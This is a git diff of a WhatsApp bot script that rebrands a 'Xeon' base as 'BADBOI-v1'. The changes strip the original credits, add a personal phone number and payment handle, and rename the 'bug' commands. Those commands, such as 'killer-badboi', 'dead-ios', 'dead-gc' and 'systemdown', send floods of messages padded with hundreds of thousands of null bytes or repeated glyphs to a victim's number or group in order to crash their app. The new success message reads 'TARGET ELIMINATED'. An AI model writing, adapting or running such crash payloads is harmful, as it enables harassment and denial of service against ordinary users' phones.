@@ -1,11 +1,3 @@
-//base by DGXeon (Xeon Bot Inc.)
-//re-upload? recode? copy code? give credit ya :)
-//YouTube: @DGXeon
-//Instagram: unicorn_xeon13
-//Telegram: t.me/xeonbotinc
-//GitHub: @DGXeon
-//WhatsApp: +916909137213
-//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
 
 const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
 const os = require('os')
@@ -63,9 +55,9 @@ const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
 const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
 
 //time
-const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
-        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
-        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
+const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
+        const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
+        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
          if(time2 < "23:59:00"){
 var xeonytimewisher = `Good Night 🌌`
  }
@@ -211,7 +203,7 @@ async function sendViewOnceMessages(jid, count) {
             'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
               'buttons': [{
                 'name': "cta_url",
-                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
               }],
               'messageParamsJson': "\0".repeat(100000)
             })
@@ -264,8 +256,8 @@ async function sendListMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'listMessage': {
       'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
-      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
-      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
+      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
       'buttonText': null,
       'listType': 2,
       'productListInfo': {
@@ -496,7 +488,7 @@ var xeonlod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🕷..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -1211,11 +1203,16 @@ senddocu(buffer)
                 neww = performance.now()
                 oldd = performance.now()
                 respon = `
+		TESTING BADBOI-v1-BUG SPEED 
+  ${readmore}
 Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
 
 💻 Info Server
 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
 
+BADBOI-v1-BUG-CONNECTED SUCCESSFULLY 
+
+  ${readmore}
 _NodeJS Memory Usaage_
 ${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
 
@@ -1231,7 +1228,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1253,7 +1250,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://i.imgur.com/I5BujDY.jpeg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1265,7 +1262,9 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             }
             break
             case 'runtime':
-                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
+                let runtimetext = `𝙱𝙰𝙳-𝙱𝙾𝙸 𝚅1 𝙼𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙾𝙽𝙻𝙸𝙽𝙴. 𝙲𝙻𝙸𝙲𝙺 𝚃𝙾 𝙲𝙷𝙴𝙲𝙺 𝙼𝚈 𝚁𝚄𝙽𝚃𝙸𝙼𝙴⬇️👇
+		${readmore}
+		BAD-BOI v1 Have Been Running For ${runtime(process.uptime())}`
                 XeonBotInc.sendMessage(m.chat, {
                     text: runtimetext,
                     contextInfo: {
@@ -1273,7 +1272,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `FORGET DONATE`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1287,13 +1286,34 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'script':
             case 'scriptbot':
                 XeonBotInc.sendMessage(m.chat, {
-                    text: `Helllo world`,
+                    text: `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+•  𝑯𝒊  ${pushname}
+
+•  𝑰 𝒂𝒎 𝙱𝙰𝙳-𝙱𝙾𝙸 𝚅1 𝙱𝚄𝙶.
+
+•  𝒀𝒐𝒖 𝑪𝒂𝒏 𝑮𝒆𝒕 𝑴𝒚 𝑺𝒐𝒖𝒓𝒄𝒆 𝑪𝒐𝒅𝒆 𝑽𝒊𝒂.
+
+•  𝑻𝒉𝒆 𝑳𝒊𝒏𝒌 𝑩𝒆𝒍𝒐𝒘 ⇣⇣.
+
+ ➨𝑭𝒐𝒓𝒌 𝑨𝒏𝒅 𝑮𝒊𝒗𝒆 𝑨 𝑺𝒕𝒂𝒓 ➻ ❴ https://github.com/BADBOI-v1/BADBOI-v1 ❵
+
+•  𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒕𝒂𝒌𝒆 𝒂 𝒍𝒐𝒐𝒌 𝒐𝒏 𝒓𝒆𝒂𝒅𝒎𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 𝒅𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕.
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+𝐂𝐑𝐄𝐃𝐈𝐓𝐒
+
+𝐁𝐀𝐃𝐁𝐎𝐈-𝐯1
+
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
-                            body: `SCRIPT OF ${botname} is on YouTube @DGXeon`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            body: `SCRIPT OF ${botname} is on kiddes scripts WhatsApp channel `,
+                            thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1303,16 +1323,16 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     quoted: m
                 })
                 break
-            case 'donate':
-            case 'donasi':
+            case 'opay':
+            case 'opays':
                 let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: 'Paypal: https://www.paypal.me/josephxeon13\n\n' + textnate
+                    text: 'Opays: 8140825959-alaba-adebisi-ade\n\n' + textnate
                 }, {
                     quoted: m
                 })
                 break
-case 'owner': {
+case 'badboi': {
 const repf = await XeonBotInc.sendMessage(from, { 
 contacts: { 
 displayName: `${list.length} Contact`, 
@@ -2077,13 +2097,13 @@ await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/m
 break
 
 //bug cases
-case "xandroid": {
+case "killer-badboi": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2092,30 +2112,30 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
     return replygcxeon("The number is not registered on WhatsApp");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("please wait, " + command + " hack is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "TARGET🎯 ELIMINATED🕸☠️ @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause for unlimited minutes so that the bot is banned.", 
     [whatsappNumber]
   );
 }
 break;
-case "xios": {
+case "dead-ios": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2124,24 +2144,24 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
     return replygcxeon("The number is not registered on WhatsApp");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("please wait, " + command + " hack is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "TARGET🎯 ELIMINATED🕸☠️ @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause for unlimited minutes so that the bot is banned.", 
     [whatsappNumber]
   );
 }
 break;
-case "xios2":
+case "ios-banned":
   {
 	if (!isPremium) return replygcxeon(mess.prem)
     if (!isBot) {
@@ -2154,14 +2174,14 @@ case "xios2":
       return replygcxeon("Amount must be a number");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..");
+    replygcxeon("please wait, " + command + " hack is in process..");
     await sleep(1500); // Adjusted sleep time for clarity
     sendMultiplePaymentInvites(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
   break;
-  case "xandroid2":
+  case "hit911":
   {
 	if (!isPremium) return replygcxeon(mess.prem)
     if (!isBot) {
@@ -2174,20 +2194,20 @@ case "xios2":
       return replygcxeon("Amount must be a number");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..");
+    replygcxeon("please wait, " + command + " hack is in process..");
     await sleep(1500); // Adjusted sleep time for clarity
     sendVariousMessages(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
   break;
-  case "xgc":
+  case "dead-gc":
   {
     if (!isPremium) return replygcxeon(mess.prem)
     if (!text) {
       return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
     }
-    replygcxeon("please wait, " + command + " bug is in process..");
+    replygcxeon("please wait, " + command + " hack is in process..");
     if (!text.split(" ")[0].includes("whatsapp.com")) {
       return replygcxeon("Link Invalid!");
     }
@@ -2205,9 +2225,9 @@ case "xios2":
     }
   }
   break;
-  case "systemuicrash": {
+  case "systemdown": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
@@ -2220,30 +2240,30 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
     return replygcxeon("The number is not registered on WhatsApp");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("please wait, " + command + " hack is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "TARGET🎯 ELIMINATED🕸☠️ @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause for unlimited minutes so that the bot is banned.", 
     [whatsappNumber]
   );
 }
 break;
-case "xsysui": {
+case "good-night": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2252,19 +2272,19 @@ case "xsysui": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "916909137213") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
     return replygcxeon("The number is not registered on WhatsApp");
   }
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygcxeon("please wait, " + command + " hack is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
+    "TARGET🎯 ELIMINATED🕸☠️  @" + whatsappNumber.split('@')[0] + 
+    " Using *" + command + "* ✅\n\nPause for unlimited minutes so that the bot is banned.", 
     [whatsappNumber]
   );
 }
@@ -2283,111 +2303,129 @@ break
             case '?':
             case 'allmenu':
                 let xeonmenuoh = `Hello ${pushname}
-╰┈➤ ${xeonytimewisher} 😄
+${xeonytimewisher} 😄
 ${readmore}
-╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
-> xandroid 
-> xandroid2
-> systemuicrash
-> xsysui
+▌𝐁𝐀𝐃𝐁𝐎𝐈-𝐯1 𝐛𝐮𝐠●➤ 
+${readmore}
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ʙᴜɢ ᴀɴᴅʀᴏɪᴅ*
 
-╰┈➤ ʙᴜɢ ɪᴏꜱ
-> xios
-> xios2
+🕸 killer-badboi[234**,amount]
+🕸 hit911[amount]
+🕸 systemdown[234**,amount]
+🕸 good-night[234**,amount]
 
-╰┈➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
-> xgc
+*ʙᴜɢ ɪᴏꜱ*
 
-╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
-> getsession
-> deletesession
-> join
-> shutdown  
-> restart
-> autoread *[option]*
-> autotyping *[option]*
-> autorecording *[option]*
-> autorecordtyp *[option]*
-> autobio *[option]*
-> autoswview *[option]*
-> mode *[option]*
-> block
-> unblock 
-> backup
-> getcase
-> addowner
-> delowner
+🕷 dead-ios[234**,amount]
+🕷 ios-banned[amount]
 
-╰┈➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
-> closetime
-> opentime
-> kick
-> add
-> promote
-> demote
-> setdesc
-> setppgc
-> tagall
-> hidetag
-> totag
-> group *[option]*
-> editinfo
-> linkgc
-> revoke
-> listonline
+*ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ*
 
-╰┈➤ ᴍᴀɪɴ ᴍᴇɴᴜ
-> menu
-> buypremium
-> runtime
-> script
-> donate
-> owner
+🕷 dead-gc[link,amount]
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ᴏᴡɴᴇʀ ᴍᴇɴᴜ*
 
-╰┈➤ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ
-> sticker
-> smeme
-> take
-> toimage
-> tovideo
-> toaudio
-> tomp3
-> tovn
-> togif
-> tourl
-> toqr
-> toviewonce
-> fliptext
-> emojimix
+• getsession
+• deletesession
+• join
+• shutdown  
+• restart
+• autoread *[option]*
+• autotyping *[option]*
+• autorecording *[option]*
+• autorecordtyp *[option]*
+• autobio *[option]*
+• autoswview *[option]*
+• mode *[option]*
+• block
+• unblock 
+• backup
+•️ getcase
+• addowner
+• delowner
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ɢʀᴏᴜᴘ ᴍᴇɴᴜ*
 
-╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
-> addvideo
-> addimage
-> addsticker
-> addvn
-> addzip
-> addapk
-> addpdf
-> delvideo
-> delimage
-> delsticker
-> delvn
-> delzip
-> delapk
-> delpdf
-> listvideo
-> listimage
-> liststicker
-> listvn
-> listzip
-> listapk
-> listpdf
+• closetime
+• opentime
+• kick
+• add
+• promote
+• demote
+• setdesc
+• setppgc
+• tagall
+• hidetag
+• totag
+• group *[option]*
+• editinfo
+• linkgc
+• revoke
+• listonline
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ᴍᴀɪɴ ᴍᴇɴᴜ*
 
-╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ
-> play
-> ytmp3
-> ytmp4
-> sound1 - sound161`
+• menu
+• buypremium
+• runtime
+• script
+• opay
+• badboi
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ*
+
+• sticker
+• smeme
+• take
+• toimage
+• tovideo
+• toaudio
+• tomp3
+• tovn
+• togif
+• tourl
+• toqr
+• toviewonce
+• fliptext
+• emojimix
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ*
+
+• addvideo
+• addimage
+• addsticker
+• addvn
+• addzip
+• addapk
+• addpdf
+• delvideo
+• delimage
+• delsticker
+• delvn
+• delzip
+• delapk
+• delpdf
+• listvideo
+• listimage
+• liststicker
+• listvn
+• listzip
+• listapk
+• listpdf
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*ᴅᴏᴡɴ ᴍᴇɴᴜ*
+
+• play
+• ytmp3
+• ytmp4
+• sound1 - sound161
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+> credits
+
+𝐁𝐀𝐃-𝐁𝐎𝐈
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         text: xeonmenuoh,
@@ -2395,7 +2433,7 @@ if (typemenu === 'v1') {
                             externalAdReply: {
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://i.ibb.co/kSs1stX/thumb.jpg',
+                                thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                                 sourceUrl: link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -2413,7 +2451,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
+      thumbnailUrl: 'https://imgur.com/nnUK2pA',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
